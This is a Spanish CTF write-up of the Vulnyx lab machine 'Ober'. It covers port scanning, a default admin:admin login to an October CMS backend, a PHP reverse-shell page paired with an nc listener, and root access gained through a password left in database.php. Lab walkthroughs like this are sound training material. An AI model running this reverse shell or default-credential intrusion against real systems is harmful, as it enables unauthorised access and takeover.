---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Ober Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 05:48 EDT
Nmap scan report for 192.168.5.91
Host is up (0.0023s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)
|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)
|_  256 95:1f:32:95:78:08:50:45:cd:8c:7c:71:4a:d4:6c:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Homepage &#124; My new websites
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
|_http-open-proxy: Proxy might be redirecting requests
MAC Address: 08:00:27:20:C2:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds
```

Veremos que hay varios puertos interesantes como por ejemplo el `80` y el `8080`, si entramos en el `80` veremos una pagina web normal que parece ser que esta bajo un `software` sofisticado y no a mano directamente, vamos a investigar un poco bajo que contenido esta esta pagina.

Con `Wappalyzer` podremos ver esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-28 140728.png" alt=""><figcaption></figcaption></figure>

En el gestor de contenido de `CMS` veremos que esta bajo `October CMS`, vamos a investigar un poco mas esto.

Si intentamos realizar un `fuzzing` veremos que da muchos errores a nivel de peticion, por eso tendremos que buscar la estructura de carpetas con la que se compone dicho `software`, si nos vamos a esta `URL` veremos que muestra de forma publica la estructura:

URL = [Estructura de directorios October CMS](https://docs.octobercms.com/2.x/setup/structure.html#vendor-directory)

Aqui podremos ver todas las rutas como por ejemplo `system`, `cms`, `backend`, etc... Lo que vemos interesante es el directorio `backend`, vamos a probar a entrar a ver que vemos.

## Escalate user www-data

```
URL = http://<IP>/backend
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-28 141454.png" alt=""><figcaption></figcaption></figure>

Veremos que si nos lleva a un `login` por lo que vamos a probar credenciales por defecto, si buscamos las credenciales por defecto, veremos lo siguiente:

URL = [Defaults Password Admin CMS](https://octobercms.com/forum/post/is-there-a-default-admin-user-password-and-name)

Vemos que hay un usuario que pone que las credenciales por defecto seria `admin:admin`, vamos a probarlas a ver si funciona.

```
User: admin
Pass: admin
```

Veremos que ha funcionado, por lo que estamos dentro del panel, si nos vamos a `CMS` -> `+ Add`, dentro de esta parte tendremos que crear una pagina en la que podremos obtener una `shell`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-28 142608.png" alt=""><figcaption></figcaption></figure>

> shell.php

```php
function onStart() {
    $sock = fsockopen("<IP>", <PORT>);
    $proc = proc_open("sh", [
        0 => $sock,
        1 => $sock,
        2 => $sock
    ], $pipes);
}
```

Ahora vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora vamos a darle a `Save` para que se guarde la pagina, una vez echo esto vamos acceder con `curl` a dicha pagina que hemos creado de `/shell` para que se nos haga la conexion:

```shell
curl -sX GET "http://<IP>/shell"
```

Ahora si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.91] 53468
whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si entramos en la carpeta `config/` veremos varios `.php` que son interesantes entre ellos, veremos un archivo llamado `database.php`, vamos a ver que contiene:

```shell
cd /var/www/html/octobercms/config
cat database.php
```

Info:

```
'connections' => [

        'sqlite' => [
            'driver'   => 'sqlite',
            'database' => 'storage/database.sqlite',
            'prefix'   => '',
        ],

        'mysql' => [
            'driver'     => 'mysql',
            'engine'     => 'InnoDB',
            'host'       => 'localhost',
            'port'       => '3306',
            'database'   => 'octoberdb',
            'username'   => 'root',
            'password'   => 'root',
         // 'password'   => 'r00tP@ssW0rd',
            'charset'    => 'utf8mb4',
            'collation'  => 'utf8mb4_unicode_ci',
            'prefix'     => '',
            'varcharmax' => 191,
        ],

        'pgsql' => [
            'driver'   => 'pgsql',
            'host'     => 'localhost',
            'port'     => 5432,
            'database' => 'database',
            'username' => 'root',
            'password' => '',
            'charset'  => 'utf8',
            'prefix'   => '',
            'schema'   => 'public',
        ],

        'sqlsrv' => [
            'driver'   => 'sqlsrv',
            'host'     => 'localhost',
            'port'     => 1433,
            'database' => 'database',
            'username' => 'root',
            'password' => '',
            'prefix'   => '',
        ],

    ],
```

Veremos esta seccion bastante interesante:

```
'mysql' => [
            'driver'     => 'mysql',
            'engine'     => 'InnoDB',
            'host'       => 'localhost',
            'port'       => '3306',
            'database'   => 'octoberdb',
            'username'   => 'root',
            'password'   => 'root',
         // 'password'   => 'r00tP@ssW0rd',
            'charset'    => 'utf8mb4',
            'collation'  => 'utf8mb4_unicode_ci',
            'prefix'     => '',
            'varcharmax' => 191,
        ],
```

Veremos que en el `password` contiene `r00tP@ssW0rd`, vamos a probar a ver si esa fuera la contraseña del usuario `root`.

```shell
su root
```

Metemos como contraseña `r00tP@ssW0rd`...

```
root@ober:/var/www/html/octobercms/config# whoami
root
```

Veremos que ha funcionado y seremos `root` directamente, por lo que leeremos la `flag` de `root` y la del usuario.

> user.txt

```
75970994f3256f77ad3ffca0ee61e3cc
```

> root.txt

```
5dfcd9cc7d148d769538039077e5d021
```
